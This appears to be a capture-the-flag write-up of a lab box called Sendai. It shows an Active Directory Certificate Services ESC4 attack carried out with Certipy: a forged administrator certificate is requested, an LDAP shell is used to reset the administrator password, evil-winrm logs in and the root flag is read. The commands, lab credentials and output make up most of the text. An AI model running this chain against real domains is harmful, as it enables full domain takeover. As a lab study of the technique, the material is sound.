    Enrollment Flag                     : AutoEnrollment
    Extended Key Usage                  : Server Authentication
                                          Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 100 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 4096
    Template Created                    : 2023-07-11T12:46:12+00:00
    Template Last Modified              : 2023-07-11T12:46:19+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : SENDAI.VL\Domain Admins
                                          SENDAI.VL\Domain Computers
                                          SENDAI.VL\Enterprise Admins
      Object Control Permissions
        Owner                           : SENDAI.VL\Administrator
        Full Control Principals         : SENDAI.VL\Domain Admins
                                          SENDAI.VL\Enterprise Admins
                                          SENDAI.VL\ca-operators
        Write Owner Principals          : SENDAI.VL\Domain Admins
                                          SENDAI.VL\Enterprise Admins
                                          SENDAI.VL\ca-operators
        Write Dacl Principals           : SENDAI.VL\Domain Admins
                                          SENDAI.VL\Enterprise Admins
                                          SENDAI.VL\ca-operators
        Write Property Enroll           : SENDAI.VL\Domain Admins
                                          SENDAI.VL\Domain Computers
                                          SENDAI.VL\Enterprise Admins
    [+] User Enrollable Principals      : SENDAI.VL\Domain Computers
                                          SENDAI.VL\ca-operators
    [+] User ACL Principals             : SENDAI.VL\ca-operators
    [!] Vulnerabilities
      ESC4                              : User has dangerous permissions.


➜  Sendai certipy req -u 'clifford.davey' -p 'RFmoB2WplgE_3p' \ 
  -dc-ip 10.129.234.66 \
  -target 10.129.234.66 \
  -ca 'sendai-DC-CA' \
  -template SENDAICOMPUTER \
  -upn 'administrator' \
  -sid 'S-1-5-21-3085872742-570972823-736764132-500'
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error: The NETBIOS connection with the remote host timed out.
[-] Use -debug to print a stacktrace
➜  Sendai certipy-ad req -u 'clifford.davey' -p 'RFmoB2WplgE_3p' \
  -dc-ip 10.129.234.66 \
  -target 10.129.234.66 \
  -ca 'sendai-DC-CA' \
  -template SENDAICOMPUTER \
  -upn 'administrator' \
  -sid 'S-1-5-21-3085872742-570972823-736764132-500' -debug
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[+] Nameserver: '10.129.234.66'
[+] DC IP: '10.129.234.66'
[+] DC Host: None
[+] Target IP: '10.129.234.66'
[+] Remote Name: '10.129.234.66'
[+] Domain: ''
[+] Username: 'CLIFFORD.DAVEY'
[+] Generating RSA key
[*] Requesting certificate via RPC
[+] Trying to connect to endpoint: ncacn_np:10.129.234.66[\pipe\cert]
[+] Connected to endpoint: ncacn_np:10.129.234.66[\pipe\cert]
[*] Request ID is 7
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator'
[+] Found SID in SAN URL: 'S-1-5-21-3085872742-570972823-736764132-500'
[+] Found SID in security extension: 'S-1-5-21-3085872742-570972823-736764132-500'
[*] Certificate object SID is 'S-1-5-21-3085872742-570972823-736764132-500'
[*] Saving certificate and private key to 'administrator.pfx'
[+] Attempting to write data to 'administrator.pfx'
[+] Data written to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'



I got some kerberos errors like this

➜  Sendai certipy auth -pfx administrator.pfx -dc-ip 10.129.234.66 -username administrator -domain sendai.vl -debug
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[+] Target name (-target) and DC host (-dc-host) not specified. Using domain '' as target name. This might fail for cross-realm operations
[+] Nameserver: '10.129.234.66'
[+] DC IP: '10.129.234.66'
[+] DC Host: ''
[+] Target IP: '10.129.234.66'
[+] Remote Name: '10.129.234.66'
[+] Domain: ''
[+] Username: 'ADMINISTRATOR'
[*] Certificate identities:
[*]     SAN UPN: 'administrator'
[*]     SAN URL SID: 'S-1-5-21-3085872742-570972823-736764132-500'
[*]     Security Extension SID: 'S-1-5-21-3085872742-570972823-736764132-500'
[+] Found SID in SAN URL: 'S-1-5-21-3085872742-570972823-736764132-500'
[+] Found SID in security extension: 'S-1-5-21-3085872742-570972823-736764132-500'
[*] Using principal: 'administrator@sendai.vl'
[*] Trying to get TGT...
[+] Sending AS-REQ to KDC sendai.vl (10.129.234.66)
[-] Got error while trying to request TGT: Kerberos SessionError: KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type)
Traceback (most recent call last):
  File "/usr/lib/python3/dist-packages/certipy/commands/auth.py", line 596, in kerberos_authentication
    tgt = sendReceive(as_req, domain, self.target.target_ip)
  File "/usr/lib/python3/dist-packages/impacket/krb5/kerberosv5.py", line 93, in sendReceive
    raise krbError
impacket.krb5.kerberosv5.KerberosError: Kerberos SessionError: KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type)
[-] See the wiki for more information


So decided to use this method to get ldap shell and change administrator password.

➜  Sendai certipy auth -pfx administrator.pfx -dc-ip 10.129.234.66 -username administrator -domain sendai.vl -ldap-shell
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator'
[*]     SAN URL SID: 'S-1-5-21-3085872742-570972823-736764132-500'
[*]     Security Extension SID: 'S-1-5-21-3085872742-570972823-736764132-500'
[*] Connecting to 'ldaps://10.129.234.66:636'
[*] Authenticated to '10.129.234.66' as: 'u:SENDAI\\Administrator'
Type help for list of commands

# whoami
u:SENDAI\Administrator

# cd C:\Users\Administrator\Desktop
*** Unknown syntax: cd C:\Users\Administrator\Desktop

# change_password administrator Password123#
Got User DN: CN=Administrator,CN=Users,DC=sendai,DC=vl
Attempting to set new password of: Password123#
Password changed successfully!

# exit
Bye!
➜  Sendai evil-winrm -i 10.129.234.66 -u Administrator -p 'Password123#'
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir


    Directory: C:\Users\Administrator\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         4/15/2025   8:27 PM             32 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
1bc134a7b4ae19fcc072082026d991cf
*Evil-WinRM* PS C:\Users\Administrator\Desktop> 


Full domain compromise — root.txt confirms it. Worth understanding exactly why this path succeeded where the others stalled, since the pattern will repeat on other boxes.

Why Kerberos/PKINIT (certipy auth without -ldap-shell) failed
KDC_ERR_PADATA_TYPE_NOSUPP means the KDC doesn’t support the PKINIT pre-authentication type certipy sent in that AS-REQ. This usually happens when:

    The DC has PKINIT partially hardened/disabled, or requires a specific padata format (PA-PK-AS-REQ vs the older PA-PK-AS-REQ-WIN2K) that this certipy build isn’t negotiating correctly, or
    There’s a KDC-side policy (like StrongCertificateBindingEnforcement configured unusually, or smart-card-only PKINIT restrictions) rejecting this specific request type.

This is a known friction point with ADCS cert-based Kerberos auth — it’s TLS-cert data wrapped inside a Kerberos message, which is a much narrower, stricter protocol path than plain LDAP TLS. It’s common enough in CTF/lab environments (especially HTB-style boxes) that -ldap-shell is often the go-to fallback specifically because of this.

Why -ldap-shell worked instead
This path doesn’t touch Kerberos at all. It authenticates using Schannel — TLS client-certificate authentication directly against LDAPS (port 636). Active Directory validates your cert against the CA trust chain and maps it to the Administrator account purely at the TLS/LDAP layer, with no Kerberos pre-auth negotiation involved. Since your cert was legitimately issued by the domain’s own CA (even though via the ESC4 abuse), AD trusts it completely for Schannel binding — much simpler mechanism, fewer places for a padata-format mismatch to break things.